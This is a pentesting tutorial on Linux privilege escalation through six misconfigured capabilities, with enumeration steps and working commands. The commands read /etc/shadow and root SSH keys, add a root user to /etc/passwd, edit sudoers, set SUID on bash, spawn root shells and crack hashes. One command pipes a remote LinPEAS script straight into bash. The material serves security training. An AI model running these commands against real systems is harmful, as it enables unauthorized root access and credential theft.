# Capabilities – Linux Privilege Escalation

*Source: Juggernaut Pentesting Academy, published Oct 28, 2022*

In this post, we will perform a deep-dive on how to exploit various capabilities. Specifically, we will see how six different capabilities can be leveraged by an attacker to obtain Linux Privilege Escalation to root.

We will begin by enumerating capabilities using both manual methods as well as tools. Once we obtain a list of potentially exploitable capabilities, we will go over how to exploit them one by one.

## What are Capabilities?

Capabilities are special attributes that provide specific (elevated) privileges that are normally reserved for root-level actions. Capabilities work by breaking up root privileges into smaller and distinctive units that can be allocated to processes, binaries, services, and users. When capabilities are set too loosely, or when they have been set on a binary that allows file reads, file writes, or command execution, this could allow an attacker to elevate their privileges to root.

As an attacker, when we see capabilities set we need to think about: which capability is being used? what the capability is set on? and, what can we do with this capability that we otherwise wouldn't be able to do if it was not set?

There are many different capabilities in Linux (37 on Ubuntu 16.04, even more on newer versions). This post covers 6 of the more dangerous ones.

## Enumerating Capabilities

### Manual Method

Since processes, binaries, services, and users can all have capabilities set to them, there are several different commands and locations to find capability information.

#### Process Capabilities

```
ps -ef
cat /proc/<PID>/status | grep Cap
capsh --decode=<hex_value>
```

The five capability types:
- CapInh = Inherited capabilities
- CapPrm = Permitted capabilities
- CapEff = Effective capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set

#### Service Capabilities

Check service files in:
- `/usr/lib/systemd/system/*`
- `/etc/systemd/system/*`
- `/run/systemd/system/*`
- `/lib/systemd/system/*`

Look for `AmbientCapabilities` in the service file. By default a service running as root will have all the capabilities assigned.

#### User Capabilities

User-assigned capabilities are found in `/etc/security/capability.conf`.

#### Binary Capabilities

```
getcap -r / 2>/dev/null
```

Note: capabilities are often set on copies of binaries moved to non-standard locations to avoid tampering with the original.

### LinPEAS Method

Run LinPEAS to automatically enumerate capabilities:

```
# Download into memory (no disk touch)
curl 172.16.1.30/linpeas.sh | bash
```

Check the **Interesting Files** section for process, file, and user capabilities. Red/yellow findings indicate high-certainty privilege escalation paths.

## Exploiting Various Capabilities

The six capabilities covered:
- `cap_dac_read_search` — privileged file reads
- `cap_dac_override` — privileged file writes
- `cap_chown` — ownership change of any file
- `cap_fowner` — permission change of any file
- `cap_setuid` — execute as file owner (equivalent to SUID)
- `cap_setgid` — execute as group owner (equivalent to SGID)

Use [GTFOBins](https://gtfobins.github.io/) to find exploitation commands. **Important:** when the capability grants read/write access, look for the "File Read" or "File Write" function on GTFOBins, not just "Capabilities" — the capabilities section focuses on `cap_setuid` specifically.

### cap_dac_read_search

Allows reading ANY file on the filesystem. Useful for:
- `/etc/shadow` — password hashes
- `/root/.ssh/id_rsa` — root SSH key
- Config files with credentials

Always use absolute path to the capable binary (not PATH-resolved), since capabilities are set on specific copies.

**gdb:**
```
/home/juggernaut/bin/gdb -nx -ex 'python print(open("/etc/shadow").read())' -ex quit
```

**perl:**
```
/home/juggernaut/bin/perl -ne print '/root/.ssh/id_rsa'
```

**tar:**
```
/home/juggernaut/bin/tar xf "/root/.bash_history" -I '/bin/sh -c "cat 1>&2"'
```

**vim:**
```
/home/juggernaut/bin/vim /root/passwords.txt
```

### cap_dac_override

Allows writing to ANY file. Options include:
- Add a root user to `/etc/passwd`
- Edit `/etc/sudoers` to grant NOPASSWD

**python3** (append a root user to /etc/passwd):
```
# Generate hash
openssl passwd password

# Append new root user
/home/juggernaut/bin/python3 -c 'open("/etc/passwd","a").write("r00t:eVpbhRfVtH1Uc:0:0:root:/root:/bin/bash")'
```

**vim** (edit sudoers to add NOPASSWD):
```
/home/juggernaut/bin/vim /etc/sudoers
```
Then add `NOPASSWD` to the juggernaut entry, save with `:wq!`.

### cap_chown

Allows changing ownership of ANY file or directory.

**perl** (change shadow file ownership to current user):
```
/home/juggernaut/bin/perl -e 'chown 1000,42,"/etc/shadow"'
```
Then edit shadow file to replace root's password hash (generate with `mkpasswd -m sha-512 password`).

**python3** (change /root directory ownership):
```
/home/juggernaut/bin/python3 -c 'import os;os.chown("/root",1000,0)'
```

### cap_fowner

Allows changing permissions of ANY file or directory. Most dangerous capability — can set SUID bit on any binary.

**python3** (set SUID on bash):
```
/home/juggernaut/bin/python3 -c 'import os;os.chmod("/bin/bash", 0o4755)'
/bin/bash -p
```

> Best practice: copy the binary to /tmp first rather than altering the original system binary.

### cap_setuid

Allows running as root (UID 0). Most common capability in CTFs.

**perl:**
```
/home/juggernaut/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**python3:**
```
/home/juggernaut/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### cap_setgid

Allows running as any group. Less powerful than cap_setuid — primarily elevated read access.

**python3** (get shadow group access to read /etc/shadow):
```
/home/juggernaut/bin/python3 -c 'import os; os.setgid(42); os.system("/bin/bash")'
cat /etc/shadow
```

Then crack hashes with hashcat:
```
hashcat -m 1800 ./hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

## Final Thoughts

Key mindset: when you find a capability, think about what that capability enables you to do, then find the appropriate GTFOBins function for that action (not just the "Capabilities" section). Chain capabilities with other techniques — e.g., `cap_dac_read_search` to find credentials → use credentials for further escalation.
